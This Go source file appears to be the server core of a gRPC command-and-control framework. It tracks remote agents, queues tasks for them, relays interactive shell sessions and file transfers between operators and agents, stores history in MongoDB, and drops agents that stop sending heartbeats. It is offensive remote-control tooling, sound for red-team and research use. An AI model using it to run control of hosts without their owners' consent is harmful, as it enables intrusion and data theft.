package main

import (
	"fmt"
	"sync"
	"time"

	pb "github.com/ardhptr21/c2-grpc/pb"
	"github.com/google/uuid"
	"go.mongodb.org/mongo-driver/mongo"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
)

type Agent struct {
	Hostname string
	OS       string
	IP       string
	Status   string
	LastSeen time.Time
}

type AgentRecord struct {
	AgentID   string    `bson:"agent_id"`
	Hostname  string    `bson:"hostname"`
	OS        string    `bson:"os"`
	IP        string    `bson:"ip"`
	Status    string    `bson:"status"`
	LastSeen  time.Time `bson:"last_seen"`
	IsOnline  bool      `bson:"is_online"`
	UpdatedAt time.Time `bson:"updated_at"`
}

type TaskExecution struct {
	TaskID      string    `bson:"task_id"`
	AgentID     string    `bson:"agent_id"`
	Command     string    `bson:"command"`
	Args        string    `bson:"args"`
	Output      string    `bson:"output"`
	ExecutedAt  time.Time `bson:"executed_at"`
	CompletedAt time.Time `bson:"completed_at"`
}

type TaskRecord struct {
	TaskID     string
	AgentID    string
	Command    string
	Args       string
	ExecutedAt time.Time
}

type agentShellConn struct {
	stream pb.ShellService_AgentShellServer
	mu     sync.Mutex
}

type operatorShellConn struct {
	stream pb.ShellService_OperatorShellServer
	mu     sync.Mutex
}

type shellSession struct {
	AgentID    string
	OperatorID string
}

type agentFileConn struct {
	stream pb.FileService_AgentTransferServer
	mu     sync.Mutex
}

type operatorFileConn struct {
	stream pb.FileService_OperatorTransferServer
	mu     sync.Mutex
}

type fileTransfer struct {
	AgentID    string
	OperatorID string
}

var (
	agentsMu sync.RWMutex
	agents   = make(map[string]*Agent)

	tasksMu sync.Mutex
	tasks   = make(map[string][]pb.Task)

	outputsMu sync.Mutex
	outputs   = make(map[string][]string)

	taskRecordsMu sync.Mutex
	taskRecords   = make(map[string]TaskRecord)

	operatorsMu sync.Mutex
	operators   = make(map[string]pb.OperatorService_ConnectServer)

	agentStreamsMu sync.Mutex
	agentStreams   = make(map[string]pb.TaskService_ReceiveTasksServer)

	agentShellsMu sync.Mutex
	agentShells   = make(map[string]*agentShellConn)

	operatorShellsMu sync.Mutex
	operatorShells   = make(map[string]*operatorShellConn)

	shellSessionsMu sync.Mutex
	shellSessions   = make(map[string]shellSession)

	agentFilesMu sync.Mutex
	agentFiles   = make(map[string]*agentFileConn)

	operatorFilesMu sync.Mutex
	operatorFiles   = make(map[string]*operatorFileConn)

	fileTransfersMu sync.Mutex
	fileTransfers   = make(map[string]fileTransfer)

	mongoClient       *mongo.Client
	historyCollection *mongo.Collection
	agentCollection   *mongo.Collection
)

type agentServer struct {
	pb.UnimplementedAgentServiceServer
}

type heartbeatServer struct {
	pb.UnimplementedHeartbeatServiceServer
}

type taskServer struct {
	pb.UnimplementedTaskServiceServer
}

type outputServer struct {
	pb.UnimplementedOutputServiceServer
}

type operatorServer struct {
	pb.UnimplementedOperatorServiceServer
}

type historyServer struct {
	pb.UnimplementedHistoryServiceServer
}

type shellServer struct {
	pb.UnimplementedShellServiceServer
}

type fileServer struct {
	pb.UnimplementedFileServiceServer
}

func shortUUID(n int) string {
	return uuid.NewString()[:n]
}

func removeAgent(agentID string) (string, bool) {
	agentsMu.Lock()
	agent, ok := agents[agentID]
	if ok {
		delete(agents, agentID)
	}
	agentsMu.Unlock()
	if !ok {
		return "", false
	}

	tasksMu.Lock()
	delete(tasks, agentID)
	tasksMu.Unlock()

	var taskIDs []string
	taskRecordsMu.Lock()
	for taskID, record := range taskRecords {
		if record.AgentID == agentID {
			taskIDs = append(taskIDs, taskID)
			delete(taskRecords, taskID)
		}
	}
	taskRecordsMu.Unlock()

	outputsMu.Lock()
	for _, taskID := range taskIDs {
		delete(outputs, taskID)
	}
	outputsMu.Unlock()

	agentStreamsMu.Lock()
	delete(agentStreams, agentID)
	agentStreamsMu.Unlock()

	agentShellsMu.Lock()
	delete(agentShells, agentID)
	agentShellsMu.Unlock()

	shellSessionsMu.Lock()
	for sessionID, session := range shellSessions {
		if session.AgentID == agentID {
			delete(shellSessions, sessionID)
		}
	}
	shellSessionsMu.Unlock()

	agentFilesMu.Lock()
	delete(agentFiles, agentID)
	agentFilesMu.Unlock()

	fileTransfersMu.Lock()
	for transferID, transfer := range fileTransfers {
		if transfer.AgentID == agentID {
			delete(fileTransfers, transferID)
		}
	}
	fileTransfersMu.Unlock()

	return agent.Hostname, true
}

func removeAgentAndBroadcast(agentID string) {
	hostname, ok := removeAgent(agentID)
	if !ok {
		return
	}
	markAgentOffline(agentID, hostname)

	go broadcastToOperators(&pb.OperatorEvent{
		Type:    "agent_removed",
		AgentId: agentID,
		Payload: hostname,
	})
}

func broadcastToOperators(event *pb.OperatorEvent) {
	operatorsMu.Lock()
	streams := make([]pb.OperatorService_ConnectServer, 0, len(operators))
	for _, stream := range operators {
		streams = append(streams, stream)
	}
	operatorsMu.Unlock()

	for _, stream := range streams {
		_ = stream.Send(event)
	}
}

func sendToAgentShell(agentID string, req *pb.OperatorShellRequest) error {
	agentShellsMu.Lock()
	conn, ok := agentShells[agentID]
	agentShellsMu.Unlock()
	if !ok {
		return status.Error(codes.NotFound, "agent shell stream unavailable")
	}

	conn.mu.Lock()
	defer conn.mu.Unlock()
	return conn.stream.Send(req)
}

func sendToOperatorShell(operatorID string, event *pb.AgentShellEvent) error {
	operatorShellsMu.Lock()
	conn, ok := operatorShells[operatorID]
	operatorShellsMu.Unlock()
	if !ok {
		return status.Error(codes.NotFound, "operator shell stream unavailable")
	}

	conn.mu.Lock()
	defer conn.mu.Unlock()
	return conn.stream.Send(event)
}

func sendToAgentFile(agentID string, req *pb.OperatorFileRequest) error {
	agentFilesMu.Lock()
	conn, ok := agentFiles[agentID]
	agentFilesMu.Unlock()
	if !ok {
		return status.Error(codes.NotFound, "agent file stream unavailable")
	}

	conn.mu.Lock()
	defer conn.mu.Unlock()
	return conn.stream.Send(req)
}

func sendToOperatorFile(operatorID string, event *pb.AgentFileEvent) error {
	operatorFilesMu.Lock()
	conn, ok := operatorFiles[operatorID]
	operatorFilesMu.Unlock()
	if !ok {
		return status.Error(codes.NotFound, "operator file stream unavailable")
	}

	conn.mu.Lock()
	defer conn.mu.Unlock()
	return conn.stream.Send(event)
}

func closeFileTransfersForOperator(operatorID string) {
	var requests []*pb.OperatorFileRequest

	fileTransfersMu.Lock()
	for transferID, transfer := range fileTransfers {
		if transfer.OperatorID == operatorID {
			requests = append(requests, &pb.OperatorFileRequest{
				Type:       "cancel",
				TransferId: transferID,
				AgentId:    transfer.AgentID,
			})
			delete(fileTransfers, transferID)
		}
	}
	fileTransfersMu.Unlock()

	for _, req := range requests {
		_ = sendToAgentFile(req.GetAgentId(), req)
	}
}

func closeFileTransfersForAgent(agentID string) {
	var notify []struct {
		operatorID string
		transferID string
	}

	fileTransfersMu.Lock()
	for transferID, transfer := range fileTransfers {
		if transfer.AgentID == agentID {
			notify = append(notify, struct {
				operatorID string
				transferID string
			}{operatorID: transfer.OperatorID, transferID: transferID})
			delete(fileTransfers, transferID)
		}
	}
	fileTransfersMu.Unlock()

	for _, item := range notify {
		_ = sendToOperatorFile(item.operatorID, &pb.AgentFileEvent{
			Type:       "error",
			TransferId: item.transferID,
			AgentId:    agentID,
			Message:    "agent file transfer disconnected",
		})
	}
}

func closeShellSessionsForOperator(operatorID string) {
	var requests []*pb.OperatorShellRequest

	shellSessionsMu.Lock()
	for sessionID, session := range shellSessions {
		if session.OperatorID == operatorID {
			requests = append(requests, &pb.OperatorShellRequest{
				Type:      "close",
				SessionId: sessionID,
				AgentId:   session.AgentID,
			})
			delete(shellSessions, sessionID)
		}
	}
	shellSessionsMu.Unlock()

	for _, req := range requests {
		_ = sendToAgentShell(req.GetAgentId(), req)
	}
}

func closeShellSessionsForAgent(agentID string) {
	var notify []struct {
		operatorID string
		sessionID  string
	}

	shellSessionsMu.Lock()
	for sessionID, session := range shellSessions {
		if session.AgentID == agentID {
			notify = append(notify, struct {
				operatorID string
				sessionID  string
			}{operatorID: session.OperatorID, sessionID: sessionID})
			delete(shellSessions, sessionID)
		}
	}
	shellSessionsMu.Unlock()

	for _, item := range notify {
		_ = sendToOperatorShell(item.operatorID, &pb.AgentShellEvent{
			Type:      "closed",
			SessionId: item.sessionID,
			AgentId:   agentID,
			Message:   "agent shell disconnected",
		})
	}
}

func startWatchdog() {
	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		var staleAgentIDs []string

		agentsMu.Lock()
		for id, agent := range agents {
			if time.Since(agent.LastSeen) > 10*time.Second {
				staleAgentIDs = append(staleAgentIDs, id)
			}
		}
		agentsMu.Unlock()

		for _, agentID := range staleAgentIDs {
			removeAgentAndBroadcast(agentID)
		}
	}
}

func pushTaskToAgent(agentID string, task pb.Task) {
	agentStreamsMu.Lock()
	stream, ok := agentStreams[agentID]
	agentStreamsMu.Unlock()

	if ok {
		if err := stream.Send(&task); err == nil {
			return
		}
	}

	tasksMu.Lock()
	tasks[agentID] = append(tasks[agentID], task)
	tasksMu.Unlock()
}

func normalizeStatus(statusText string) string {
	switch statusText {
	case "alive":
		return "ALIVE"
	case "idle":
		return "IDLE"
	case "busy":
		return "BUSY"
	default:
		return "ALIVE"
	}
}

func agentRosterPayload(hostname, ip, status string) string {
	return fmt.Sprintf("%s @ %s [%s]", hostname, ip, status)
}
